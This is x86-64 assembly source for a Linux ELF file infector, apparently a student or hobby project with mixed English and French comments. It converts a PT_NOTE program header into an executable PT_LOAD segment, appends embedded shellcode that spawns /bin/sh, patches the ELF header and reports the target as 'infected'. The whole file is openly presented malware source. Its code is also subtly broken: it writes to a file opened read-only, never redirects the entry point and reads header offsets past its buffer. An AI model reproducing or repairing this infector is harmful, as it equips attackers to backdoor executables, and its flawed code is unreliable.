section .data
	buf times 4 db 0            ; Buffer for the 4 first bytes
	ELF_numbers db 0x7F, 0x45, 0x4C , 0x46  
	is_ELF_msg db "The file is an ELF file.", 0xA, 0   ;0xA is for line break
	not_ELF_msg db "error, the file printed is not an ELF file.", 0xA, 0
	error_msg db "The programm returned an error", 0xA, 0
	error_msg_args db "error, only one argument is needed. Syntax : ./infector file", 0xA, 0
	error_msg_file db "error, the file printed is a folder. Please enter an ELF file.", 0xA, 0
	success_msg db "Bravo, the file is well infected", 0xA, 0
	payload db 0x48, 0x31, 0xd2, 0x48, 0xbb, 0x2f, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x48, 0xc1, 0xeb, 0x08, 0x53, 0x48, 0x89, 0xe7, 0x50, 0x57, 0x48, 0x89, 0xe6, 0xb0, 0x3b, 0x0f, 0x05
	payload_len equ $ - payload  ;payload length

	
section .bss 
	stat_buff resb 144 ;reserve bytes(saving space) (144bytes) for the fstat command later
	ELF_header_buff resb 52 ;save space to read and parse the ELF header
	program_header_buff resb 56 ;idem for the program header 

    phoff resq 1       ; reserve quadword = 4 times a word size = 8 bytes 
    phnum resw 1       ; reserve word = 2 times a word size = 2 bytes
	filename resb 256
	
section .text
    global _start

_start:
	mov rdi, [rsp]          ; get argc
	cmp rdi, 2              ; argc must be equal to 2 (name of the program + first argument) 
	jne wrong_args 
	mov rsi, [rsp +16]    ; getting the first argument 
	mov rdi, filename    ; filename buffer in rdi 
	call copy_string 
	call main
	call exit_program


wrong_args:
    mov rsi, error_msg_args  
    mov rdx, 61
    call print_message
    mov rax, 60
    mov rdi, 1
    syscall


main: 
    call stat_file	
    call check_if_regular_file
    call check_elf
	call parse_elfheader
	call parse_programm_header
    call close_file
    ret



stat_file:
    mov rax, 4      ; sys_stat
    mov rdi, filename
    mov rsi, stat_buff
    syscall
    test rax, rax
    js error
    ret


	
check_if_regular_file:
    mov rax, [stat_buff + 24]  ; load st_mode (16 bytes in the stat structure)
    and rax, 0xF000            ; mask to isolate the mask type bites (the "file type" bytes are located in the first 4 bytes) 
    cmp rax, 0x8000            ; 0x8000 = S_IFREG (regular file)
    je is_regular_file
    
    mov rsi, error_msg_file
    mov rdx, 63
    call print_message
    jmp exit_program

is_regular_file:
	ret


check_elf:
	; Open the file
	mov rax, 2      ; sys_open
	mov rdi, filename
	mov rsi, 0      ; read-only
	syscall
	test rax, rax
	js error
	mov rbx, rax    ; Save file descriptor


	; read the first 4 bytes in the file 
	mov rdi, rbx
	mov rax, 0                   ; sys_read 
	mov rsi, buf                 
	mov rdx, 4                   ; 4 octets read	
	syscall
	test rax, rax
	js error
	
	mov rcx, 4                   ; for the loop 
	xor rdi, rdi     
	
	call compare_loop
	
	mov rsi, is_ELF_msg
	mov rdx, 25   
	call print_message  
	ret
	

compare_loop: 
	;verify file magic bytes
	mov al, [buf + rdi]
	cmp al, [ELF_numbers + rdi]
	jne not_ELF
	inc rdi
	dec rcx
    jnz compare_loop
	ret

not_ELF:
	;Print that the file is not an ELF
	mov rsi, not_ELF_msg
	mov rdx, 44
	call print_message
	jmp exit_program 




close_file:		
	mov rdi, rbx    
	mov rax, 3      ;sys_close 
	syscall        
	ret



copy_string:
    mov al, [rsi]       
    mov [rdi], al      
    test al, al        ; check if the caracter is null
    je copy_done       
    inc rsi             
    inc rdi           
    jmp copy_string     

copy_done:
    ret  
    
    


;_______________________Parsing structures 

parse_elfheader:
	mov rax, 0
	mov rdi, rbx
	mov rsi, ELF_header_buff
	mov rdx, 52 ;number of bytes to read
	syscall
	test rax, rax
	js error

	mov rax, [ELF_header_buff + 0x20]   ;read 8 bytes 
	mov [phoff], rax

	movzx rax, word[ELF_header_buff + 0x38]   ; movzx : fills the superior bytes of the rax with 0 to ensure its the good value
	mov [phnum], rax




parse_programm_header:
  	mov rdx, [phnum]              ; number of program headers
    mov rax, [phoff]              ; offset to program headers 
    mov rcx, rdx    

	jmp parse_loop

parse_loop:
	test rcx, rcx
	jz end_parse


	mov rax, 8              ; lseek : to place ourselves at the good offset
	mov rdi, rbx
	mov rsi, [phoff]
	mov rdx, 0
	syscall 
	test rax, rax
	js error

	mov rax, 0
	mov rdi, rbx
	mov rsi, program_header_buff
	mov rdx, 56
	syscall
	test rax, rax
	js error

	mov eax, [program_header_buff]     ; grabbing the 4 first bytes 
	cmp eax, 4                        ; check if PT_NOTE
	je pt_note_found


    add qword [phoff], 56   
	dec rcx,
	jmp parse_loop

	

pt_note_found:

	mov dword [program_header_buff], 1     ;modify program header type from PT_NOTE to PT_LOAD (in p_type)

    mov dword [program_header_buff + 4], 5  ; add permissions to execute and read (r-x) / permissions are located in the offset + 4 of the programm header (in p_flags)

    ; get the file size to write the payload at the end 
    mov rax, 8     
    mov rdi, rbx    
    mov rsi, 0      ; offset
    mov rdx, 2      ; SEEK_END
    syscall
    test rax, rax
    js error

	;save file size
	mov r12, rax

	; update p_offset to point the end of the file 
    mov [program_header_buff + 8], r12

    ; update p_vaddr et p_paddr to specify where the segment will be loaded in the memory 
    mov [program_header_buff + 16], r12
    mov [program_header_buff + 24], r12


	; update p_filesz and p_memsz according to our payload size 
    mov r13, payload_len
    mov [program_header_buff + 32], r13
    mov [program_header_buff + 40], r13


	; we place oursevles at the end of the file 
    mov rax, 8     
    mov rdi, rbx    
    mov rsi, 0    
    mov rdx, 2      
    syscall
    test rax, rax
    js error

	;we write our payload at then end 
    mov rax, 1      
    mov rdi, rbx   
    mov rsi, payload
    mov rdx, payload_len
    syscall
    test rax, rax
    js error


    ; we place ourselves at the beginning of the PT_NOTE
    mov rax, 8      
    mov rdi, rbx
    mov rsi, [phoff]
    mov rdx, 0      
    syscall
    test rax, rax
    js error


	;We overwrite the program header, and make it become a PT_LOAD
    mov rax, 1      
    mov rdi, rbx
    mov rsi, program_header_buff
    mov rdx, 56     
    syscall
    test rax, rax
    js error




;________________________________________________update the main elf header (e_shoff


; Mise à jour de l'en-tête ELF principal (e_shoff)
    mov rax, 8          ; sys_lseek
    mov rdi, rbx        ; file descriptor
    mov rsi, 0          ; offset 0 (début du fichier)
    mov rdx, 0          ; SEEK_SET
    syscall
    test rax, rax
    js error

    mov rax, 0          ; sys_read
    mov rdi, rbx        ; file descriptor
    mov rsi, ELF_header_buff
    mov rdx, 52         ; Taille de l'en-tête ELF64
    syscall
    test rax, rax
    js error

    ; Mettre à jour e_shoff si nécessaire
    mov rax, [ELF_header_buff + 40]  ; e_shoff
    cmp rax, r12        ; Comparer avec la taille du fichier avant injection
    jbe .skip_update    ; Si e_shoff <= taille du fichier, pas besoin de mise à jour

    add rax, payload_len
    mov [ELF_header_buff + 40], rax  ; Mettre à jour e_shoff

    ; Réécrire l'en-tête ELF mis à jour
    mov rax, 8          ; sys_lseek
    mov rdi, rbx        ; file descriptor
    mov rsi, 0          ; offset 0 (début du fichier)
    mov rdx, 0          ; SEEK_SET
    syscall
    test rax, rax
    js error

    mov rax, 1          ; sys_write
    mov rdi, rbx        ; file descriptor
    mov rsi, ELF_header_buff
    mov rdx, 52         ; Taille de l'en-tête ELF64
    syscall
    test rax, rax
    js error



;__________________________________________________________________________

.skip_update:



	mov rsi, success_msg
	mov rdx, 32
	call print_message



	; Continuer avec les autres en-têtes de programme
	add qword [phoff], 56
	dec rcx
	jmp parse_loop


end_parse:
	ret 


    
print_message:
    mov rax, 0x1               
    mov rdi, 1                 
    syscall
    ret

exit_program:
	mov rax, 60                  
	xor rdi, rdi                
	syscall


error:
	; Handle errors (Print & exit) 
	mov rax, 0x1
	mov rdi, 1 
	mov rsi, error_msg
	mov rdx, 31
	syscall
	mov rax, 60                 
	mov rdi, 1                    ; Exit code 1
	syscall
